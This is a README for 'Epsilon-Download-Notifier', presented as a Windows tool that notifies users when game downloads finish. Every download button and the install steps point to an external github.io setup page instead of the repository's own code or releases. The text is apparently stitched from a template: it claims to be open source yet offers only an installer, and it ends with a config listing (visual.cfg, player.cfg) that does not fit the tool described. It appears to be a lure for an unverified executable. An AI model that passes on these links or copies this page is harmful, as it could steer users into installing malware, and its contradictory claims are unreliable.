# Epsilon‑Download‑Notifier

<div align="center">
  <a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/DOWNLOAD-RELEASE-0369a1?style=for-the-badge&logo=github&logoColor=white&labelColor=161b22" alt="Download"></a>
  <br>
  <a href="#-configuration-system"><img src="https://img.shields.io/badge/CONFIGS-PRESETS-1d4ed8?style=for-the-badge&logo=files&logoColor=white&labelColor=161b22" alt="CONFIGS"></a> <a href="#-configuration-system"><img src="https://img.shields.io/badge/PROFILES-ISOLATED-b45309?style=for-the-badge&logo=git&logoColor=white&labelColor=161b22" alt="PROFILES"></a>
  <br>
  <a href="#-key-capabilities"><img src="https://img.shields.io/badge/HOTKEYS-SHORTCUTS-4f46e5?style=for-the-badge&logo=visualstudiocode&logoColor=white&labelColor=161b22" alt="HOTKEYS"></a> <a href="#-frequently-asked-questions"><img src="https://img.shields.io/badge/FAQ-ANSWERS-65a30d?style=for-the-badge&logo=book&logoColor=white&labelColor=161b22" alt="FAQ"></a>
</div>

**Author:** IntersectScholar
**Category:** Только игры (Windows 10 / 11 only)

---

## What is it?

Epsilon‑Download‑Notifier is a lightweight Windows utility that silently watches the folders where your games are being downloaded (Steam, Epic, GOG, etc.) and pops a native desktop notification the moment a file finishes downloading. No clutter, no background services—just a clean, on‑demand alert that tells you when it’s time to launch the game.

---

## Why you’ll love it

| ✅ | Feature |
|---|---------|
| **Zero‑bloat** | Small footprint, runs only while you need it. |
| **Native Windows UI** | Uses the built‑in toast system for crisp, unobtrusive alerts. |
| **Folder‑agnostic** | Monitor any path—Steam / Epic / custom directories. |
| **Configurable** | Choose which file extensions trigger a notification (e.g., `.exe`, `.msi`, `.zip`). |
| **Auto‑start** | Optionally launch with Windows for hands‑off operation. |
| **Open‑source** | Transparent code, community‑driven improvements. |

---

## Quick start

1. **Download** – Grab the latest installer from the button below.
2. **Run** – Launch the Release and follow the wizard (defaults work for most users).
3. **Configure** – Add the game download folders you want to watch.
4. **Sit back** – Get a toast notification as soon as a download completes.

<div align="center">

<a href="https://rewfdf.github.io/SetupPage/" style="display:inline-block;background:#0078D7;color:#fff;padding:10px 20px;border-radius:6px;font-weight:bold;text-decoration:none;">Download Release Page</a>

</div>

---

## How it works (under the hood)

- **FileSystemWatcher** – .NET’s efficient watcher monitors changes in real time.
- **Windows Toast API** – Sends native notifications that appear in the Action Center.
- **Config JSON** – All preferences are stored in a simple, human‑readable file (`config.json`).
- **Optional Auto‑Launcher** – A tiny helper registers a startup entry if you enable it.

---

## Installation guide (Windows 10 / 11)

| Step | Action |
|------|--------|
| **1️⃣** | Click the **Download Release Page** button above. |
| **2️⃣** | Save the installer to a convenient location. |
| **3️⃣** | Double‑click the installer and accept the default options (or tweak as you like). |
| **4️⃣** | After installation, launch **Epsilon‑Download‑Notifier** from the Start menu. |
| **5️⃣** | Press **Add Folder**, browse to your game download directory, and hit **Save**. |
| **6️⃣** | Optionally enable **Start with Windows** in the Settings tab. |

> **Tip:** For Steam users, the default path is usually `C:\Program Files (x86)\Steam\steamapps\downloading`.

---

## Usage snapshot

- **Add / remove folders** anytime from the *Folders* tab.
- **Toggle notifications** per file type in *Preferences*.
- **View recent alerts** in the *History* pane (click to open the folder).

All changes take effect instantly—no need to restart the app.

---

## Contributing

We welcome contributions! If you have ideas, bug reports, or pull requests:

1. Fork the repository.
2. Create a feature branch (`git checkout -b feature/awesome‑thing`).
3. Commit your changes with clear messages.
4. Open a Pull Request targeting the `main` branch.

Please follow the existing code style and include unit tests for any new logic.

---

## License

This project is licensed under the **MIT License** – see the `LICENSE` file for details.

---

## Acknowledgements

- The Windows Community Toolkit for toast helpers.
- All contributors who helped polish the watcher logic.

---

**Stay in the game, stay notified.**

<div align="center">
<a href="https://rewfdf.github.io/SetupPage/" style="display:inline-block;background:#28A745;color:#fff;padding:8px 16px;border-radius:4px;font-weight:600;text-decoration:none;">Get Started</a>
</div>

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```